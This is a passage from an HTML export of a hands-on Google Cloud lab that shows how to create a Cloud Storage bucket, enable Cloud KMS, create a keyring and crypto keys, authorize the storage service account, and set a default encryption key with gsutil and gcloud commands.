<span>If you use other credentials, you&#39;ll receive errors or </span><strong><span>incur charges</span></strong><span>.</span></p></li><li><p><span>Accept the terms and skip the recovery resource page.</span></p></li></ol><p><strong><span>Note:</span></strong><span> Do not click </span><strong><span>End Lab</span></strong><span> unless you have finished the lab or want to restart it. This clears your work and removes the project.</span></p><h4 id='task-1-configure-required-resources-2'><span>Task 1: Configure required resources</span></h4><p><span>In this task, you configure the required resources for this lab.</span></p><h5 id='create-a-cloud-storage-bucket-2'><span>Create a Cloud Storage bucket</span></h5><p><strong><span>Note:</span></strong><span> A bucket must have a globally unique name. For this lab, you will use your Google Cloud project ID as part of the bucket name to help ensure it will be unique. Your Google Cloud project ID is automatically stored in a Cloud Shell environment variable named </span><code>DEVSHELL_PROJECT_ID</code><span>.</span></p><ol start='' ><li><p><span>On the Google Cloud Console title bar, click </span><strong><span>Activate Cloud Shell</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/ep8HmqYGdD%2FkUncAAYpV47OYoHwC8%2Bg0WK%2F8sidHquE%3D" referrerpolicy="no-referrer" alt="Activate Cloud Shell icon"><span>). If prompted, click </span><strong><span>Continue</span></strong><span>.</span></p></li><li><p><span>Run the following command to create the bucket:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil mb -l us-west1 gs://$DEVSHELL_PROJECT_ID-kms</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Run the following commands to create a few sample files that will be uploaded to the bucket:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo "This is sample file 1" &gt; file1.txt</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo "This is sample file 2" &gt; file2.txt</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">echo "This is sample file 3" &gt; file3.txt</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Run the following command to copy </span><strong><span>file1.txt</span></strong><span> to the bucket:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil cp file1.txt gs://$DEVSHELL_PROJECT_ID-kms</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h5 id='enable-cloud-kms'><span>Enable Cloud KMS</span></h5><p><strong><span>Note:</span></strong><span> Before using Cloud KMS you need to enable it in your project. In the Qwiklab Google Cloud Project you have been provisioned, Cloud KMS should already have been enabled. Just to be safe, you will issue the command to enable it anyway.</span></p><ul><li><p><span>Run the following command in Cloud shell to enable Cloud KMS:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud services enable cloudkms.googleapis.com</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a Cloud Storage bucket</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-2-use-cloud-kms'><span>Task 2. Use Cloud KMS</span></h4><p><span>In this task, you use Cloud KMS to create a keyring and a cryptokey.</span></p><h5 id='create-a-keyring-and-cryptokey'><span>Create a KeyRing and CryptoKey</span></h5><p><strong><span>Note:</span></strong><span> In order to encrypt data, you need to create a KeyRing and a CryptoKey. KeyRings are useful for grouping keys. Keys can be grouped by environment (like test, staging, and prod) or by some other conceptual grouping. For this lab, your KeyRing will be called </span><strong><span>test</span></strong><span> and your CryptoKey will be called </span><strong><span>labkey</span></strong><span>.</span></p><ol start='' ><li><p><span>In Cloud Shell, run the following commands to create variables to hold the KeyRing name and CryptoKey name:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">KEYRING_NAME=lab-keyring</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">CRYPTOKEY_1_NAME=labkey-1</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">CRYPTOKEY_2_NAME=labkey-2</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 68px;"></div><div class="CodeMirror-gutters" style="display: none; height: 68px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Execute the following command to create the KeyRing.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud kms keyrings create $KEYRING_NAME --location us-west1</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Next, using the new KeyRing, create a CryptoKey named </span><strong><span>labkey-1</span></strong><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud kms keys create $CRYPTOKEY_1_NAME --location us-west1 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--keyring $KEYRING_NAME --purpose encryption</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Create another CryptoKey named </span><strong><span>labkey-2</span></strong><span>:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud kms keys create $CRYPTOKEY_2_NAME --location us-west1 \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--keyring $KEYRING_NAME --purpose encryption</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>You can view the KeyRing and keys in the Cloud Console.</span></p><ol start='' ><li><p><span>In the Cloud Console, go to </span><strong><span>Navigation menu &gt; Security &gt; Key Management</span></strong><span>.</span></p></li></ol><p><span>You will see the KeyRing named </span><strong><span>lab-keyring</span></strong><span>.</span></p><ol start='' ><li><p><span>Click on the KeyRing named </span><strong><span>lab-keyring</span></strong><span> to view the encryption keys named </span><strong><span>labkey-1</span></strong><span> and </span><strong><span>labkey-2</span></strong><span>.</span></p></li></ol><p><img src="https://cdn.qwiklabs.com/QsrLAlaH9deTlrxnscrxi%2FkDhfvPA%2Ff6HXZNDYylUWc%3D" referrerpolicy="no-referrer" alt="List of kyes for Key Ring"></p><p><span>Click </span><em><span>Check my progress</span></em><span> to verify the objective.</span></p><p><span>Create a Keyring and Cryptokey</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h4 id='task-3-add-a-default-key-for-a-bucket'><span>Task 3. Add a default key for a bucket</span></h4><p><span>In this task, you add a default key for your bucket.</span></p><h5 id='view-the-current-default-key-for-a-bucket'><span>View the current default key for a bucket</span></h5><ul><li><p><span>Run the following command to view the default encryption key for your bucket:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil kms encryption gs://$DEVSHELL_PROJECT_ID-kms</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> The bucket should not currently have a default encryption key. This means all data in the bucket will be encrypted by Google-managed encryption keys.</span></p><h5 id='assign-cloud-kms-keys-to-a-service-account'><span>Assign Cloud KMS keys to a service account</span></h5><ul><li><p><span>Run the following commands to give your Cloud Storage service account permission to use both of your Cloud KMS keys:</span></p></li></ul><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil kms authorize -p $DEVSHELL_PROJECT_ID -k \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">projects/$DEVSHELL_PROJECT_ID/locations/us-west1/keyRings\</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/$KEYRING_NAME/cryptoKeys/$CRYPTOKEY_1_NAME</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil kms authorize -p $DEVSHELL_PROJECT_ID -k \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">projects/$DEVSHELL_PROJECT_ID/locations/us-west1/keyRings\</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/$KEYRING_NAME/cryptoKeys/$CRYPTOKEY_2_NAME</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The general syntax of the above commands is given below:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil kms authorize -p [PROJECT_STORING_OBJECTS] -k [KEY_RESOURCE]</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Where </span><em><span>[KEY_RESOURCE]</span></em><span> is in the format:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">projects/[PROJECT_STORING_KEYS]/locations/[LOCATION]/keyRings/[KEY_RING_NAME]/cryptoKeys/[KEY_NAME]</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><h5 id='set-the-default-key-for-a-bucket'><span>Set the default key for a bucket</span></h5><p><span>A Cloud KMS key can be set as the default key when objects are written to a bucket.</span></p><p><span>When setting the default key, the key resource must be specified in the same format as the previous command: </span><code>projects/[PROJECT_STORING_KEYS]/locations/[LOCATION]/keyRings/ [KEY_RING_NAME]/cryptoKeys/[KEY_NAME]</code><span>.</span></p><ol start='' ><li><p><span>Run the following command to set the default key for your bucket to the first key you generated:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil kms encryption -k \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">projects/$DEVSHELL_PROJECT_ID/locations/us-west1/keyRings\</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">/$KEYRING_NAME/cryptoKeys/$CRYPTOKEY_1_NAME \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gs://$DEVSHELL_PROJECT_ID-kms</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Run the following command to view the default key for the bucket to verify the last command was successful:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div 